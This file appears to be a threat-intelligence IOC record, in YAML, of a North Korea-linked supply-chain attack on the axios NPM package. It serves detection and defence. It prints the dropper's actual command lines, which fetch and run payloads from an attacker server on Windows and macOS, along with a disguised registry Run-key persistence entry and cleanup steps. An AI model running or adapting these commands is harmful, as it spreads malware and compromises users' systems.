@@ -1,0 +1,109 @@
+title: North Korea-Nexus Threat Actor Compromises Widely Used Axios NPM Package in
+  Supply Chain Attack
+description: UNC1069, a North Korea-nexus threat actor, compromised the axios NPM
+  package by introducing a malicious dependency (plain-crypto-js) that deploys the
+  WAVESHAPER.V2 backdoor across Windows, macOS, and Linux via a postinstall hook.
+  The campaign targeted axios versions 1.14.1 and 0.30.4 between March 31, 2026 00:21
+  and 03:20 UTC.
+attribution: UNC1069
+malware_families:
+- WAVESHAPER.V2
+- SILKBELL
+cves: []
+ttps:
+  processes:
+  - powershell.exe
+  - cmd.exe
+  - curl
+  - node
+  - bash
+  - zsh
+  command_lines:
+  - cmd.exe /c curl -s -X POST -d packages.npm.org/product1 http://sfrclak[.]com:8000/6202033
+    > %TEMP%\6202033.ps1& %PROGRAMDATA%\wt.exe -w hidden -ep bypass -file %TEMP%\6202033.ps1
+    http://sfrclak[.]com:8000/6202033 & del "PS_PATH" /f
+  - curl -o /Library/Caches/com.apple.act.mond -d packages.npm.org/product0 -s http://sfrclak[.]com:8000/6202033
+    && chmod 770 /Library/Caches/com.apple.act.mond && /bin/zsh -c "/Library/Caches/com.apple.act.mond
+    http://sfrclak[.]com:8000/6202033 &" &> /dev/null
+  - rm -rf tmp/6202033
+  - node setup.js
+  - curl -o /Library/Caches/com.apple.act.mond -d packages.npm.org/product0 -s http://sfrclak.com:8000/6202033
+    && chmod 770 /Library/Caches/com.apple.act.mond && /bin/zsh -c "/Library/Caches/com.apple.act.mond
+    http://sfrclak.com:8000/6202033 &" &> /dev/null
+  - do shell script "rm -rf tmp/6202033"
+  - start /min powershell -w h
+  powershell:
+  - '%PROGRAMDATA%\wt.exe -w hidden -ep bypass -file %TEMP%\6202033.ps1 http://sfrclak[.]com:8000/6202033'
+  - '[scriptblock]::Create([System.Text.Encoding]::UTF8.GetString'
+  - Invoke-WebRequest -UseBasicParsing
+  - -Method POST -Body
+  scripts:
+  - setup.js
+  - '%TEMP%\6202033.ps1'
+  - /tmp/ld.py
+  - '%PROGRAMDATA%\system.bat'
+  - t.unlink(K, (x => {}))
+  - t.unlink('package.json', (x => {})), t.rename('package.md', 'package.json', ord)
+  registry_keys:
+  - HKCU:\Software\Microsoft\Windows\CurrentVersion\Run
+  image_loads: []
+  network_connections:
+  - wt.exe -> sfrclak[.]com:8000
+  - curl -> sfrclak[.]com:8000
+  - /Library/Caches/com.apple.act.mond -> sfrclak[.]com:8000
+  - com.apple.act.mond -> sfrclak[.]com:8000
+  file_activity:
+  - '%PROGRAMDATA%\wt.exe'
+  - '%TEMP%\6202033.ps1'
+  - '%PROGRAMDATA%\system.bat'
+  - /Library/Caches/com.apple.act.mond
+  - /tmp/ld.py
+  - package.json
+  - package.md
+  - package-lock.json
+  persistence:
+  - Registry Run key HKCU:\Software\Microsoft\Windows\CurrentVersion\Run entry named
+    MicrosoftUpdate pointing to %PROGRAMDATA%\system.bat (hidden batch file)
+  - Registry Run key at HKCU:\Software\Microsoft\Windows\CurrentVersion\Run (MicrosoftUpdate)
+  - Dropped %PROGRAMDATA%\system.bat for Windows Stage 1 execution
+  process_relations:
+  - node -> cmd.exe
+  - cmd.exe -> curl
+  - cmd.exe -> wt.exe
+iocs:
+  hashes:
+  - e10b1fa84f1d6481625f741b69892780140d4e0e7769e7491e5f4d894c2e0e09
+  - 617b67a8e1210e4fc87c92d1d1da45a2f311c08d26e89b12307cf583c900d101
+  - ed8560c1ac7ceb6983ba995124d5917dc1a00288912387a6389296637d5f815c
+  - 04e3073b3cd5c5bfcde6f575ecf6e8c1
+  - 089e2872016f75a5223b5e02c184dfec
+  - 7658962ae060a222c0058cd4e979bfa1
+  - fcb81618bb15edfdedfb638b4c08a2af9cac9ecfa551af135a8402bf980375cf
+  - 92ff08773995ebc8d55ec4b8e1a225d0d1e51efa4ef88b8849d0071230c9645a
+  - f7d335205b8d7b20208fb3ef93ee6dc817905dc3ae0c10a0b164f4e7d07121cd
+  - 58401c195fe0a6204b42f5f90995ece5fab74ce7c69c67a24c61a057325af668
+  ip_addresses:
+  - 142.11.206[.]73
+  - 23.254.167[.]216
+  - 142.11.206.73
+  - 23.254.167.216
+  domains:
+  - sfrclak[.]com
+  - packages.npm.org
+  urls:
+  - hxxp://sfrclak[.]com:8000/6202033
+  - hxxp://sfrclak[.]com:8000
+authors:
+- Austin Larsen
+- Dima Lenz
+- Adrian Hernandez
+- Tyler McLellan
+- Christopher Gardner
+- Ashley Zaya
+- Michael Rudden
+- Mon Liclican
+- Muhammad Umair
+- GTIG
+reference: https://cloud.google.com/blog/topics/threat-intelligence/north-korea-threat-actor-targets-axios-npm-package
+date_of_publication: June 01, 2026
+file_creation_date: June 01, 2026
